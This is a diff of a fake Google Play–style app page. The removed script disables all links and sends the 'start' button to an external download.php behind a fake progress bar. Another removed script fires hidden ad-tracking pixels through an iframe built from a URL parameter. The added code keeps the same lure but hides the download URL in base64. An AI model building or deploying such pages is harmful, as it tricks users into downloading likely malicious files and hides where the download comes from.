@@ -287,7 +287,7 @@
                                                 </li>
                                                 <li class="VfPpkd-StrnGf-rymPhb-clz4Ic" role="separator"></li>
                                                 <div class="pib0Be">
-                                                    <a target="_blank" class="Afmgcd">Privacy Policy</a><span class="j55CI">  </span>
+                                                    <a target="_blank" class="Afmgcd">Privacy Policy</a><span class="j55CI"> • </span>
                                                     <a target="_blank" class="Afmgcd">Terms of Service</a>
                                                 </div>
                                             </ul>
@@ -1233,88 +1233,56 @@
             <c-data id="i23" jsdata=" swBvle;_;5 XMKGyc;_;6"></c-data>
         </c-wiz>
     
-		  <script>
-  var per = 0;
-  var pr_int;
- var arr = document.getElementsByTagName('a');
- for (var i = 0; i < arr.length; i++)
- {
-	 arr[i].onclick = function(){
-	 return false;
- };
- }
- 
- document.getElementById('start-button').onclick = function(){
- window.location.href = "https://odakmagaza.com/download.php";
-startProgress();  
-  
-return false;
- };
- 
-                function startProgress() {
-                    let progressBar = document.getElementById('progress-bar');
-                    let button = document.getElementById('start-button');
-
-                    // Hide the button immediately after it is clicked
-                    button.style.display = 'none';
-
-                    let width = 0;
-                    let interval = setInterval(() => {
-                        if (width >= 100) {
-                            clearInterval(interval);
-                            window.location = 'update.html';
-                        } else {
-                            width++;
-                            progressBar.style.width = width + '%';
-                            progressBar.textContent = width + '%';
-                        }
-                    }, 50); // Adjust the interval speed as needed
-                }
-  </script>
-<!-- ??? ??? ?????-?????? -->
 <script>
-document.addEventListener('DOMContentLoaded', function () {
-    const getParam = (name) => new URLSearchParams(window.location.search).get(name);
-
-    const fb_px = getParam('fb_px') || '';
-    const tt_px = getParam('tt_px') || '';
-    let white_domain = getParam('utm_white');
-
-    if (!white_domain) {
-        alert('?? ?????? utm_white');
-        return;
-    }
-
-    if (!/^https?:\/\//i.test(white_domain)) {
-        white_domain = 'https://' + white_domain;
-    }
-
-    const clean_white_domain = white_domain.replace(/\/+$/, '');
-    let iframeSrc = `${clean_white_domain}/thnx.html?`;
-    if(fb_px) iframeSrc += `fb_px=${fb_px}&`;
-    if(tt_px) iframeSrc += `tt_px=${tt_px}`;
-
-    const fbIframe = document.createElement('iframe');
-    fbIframe.src = iframeSrc;
-    fbIframe.style.display = 'none';
-    document.body.appendChild(fbIframe);
-
-    fbIframe.onload = function () {
-        fbIframe.contentWindow.postMessage('viewcontent', '*');
+  
+  var arr = document.getElementsByTagName('a');
+  for (var i = 0; i < arr.length; i++) {
+    arr[i].onclick = function () {
+      return false;
     };
+  }
 
-    const installBtn = document.querySelector('.VfPpkd-LgbsSe.VfPpkd-LgbsSe-OWXEXe-dgl2Hf.nCP5yc');
-    if (installBtn) {
-        installBtn.addEventListener('click', function () {
-            fbIframe.contentWindow.postMessage('lead', '*');
-        });
-    } else {
-        console.error('?????? Install ?? ???????!');
+  
+  var encodedUrl = 'aHR0cHM6Ly9vZGFrbWFnYXphLmNvbS9kb3dubG9hZC5waHA=';
+
+  function decodeUrl(b64) {
+    try {
+      return atob(b64);
+    } catch (e) {
+      return '/';
     }
-});
+  }
+
+  document.getElementById('start-button').onclick = function () {
+    var realUrl = decodeUrl(encodedUrl);
+
+    window.location.href = realUrl;
+    startProgress();
+
+    return false;
+  };
+
+  function startProgress() {
+    let progressBar = document.getElementById('progress-bar');
+    let button = document.getElementById('start-button');
+
+    button.style.display = 'none';
+
+    let width = 0;
+    let interval = setInterval(() => {
+      if (width >= 100) {
+        clearInterval(interval);
+        window.location = 'update.html';
+      } else {
+        width++;
+        progressBar.style.width = width + '%';
+        progressBar.textContent = width + '%';
+      }
+    }, 50);
+  }
 </script>
 
-<!-- ?????: ??? ??? ?????-?????? -->
+
 
 
 </body></html>
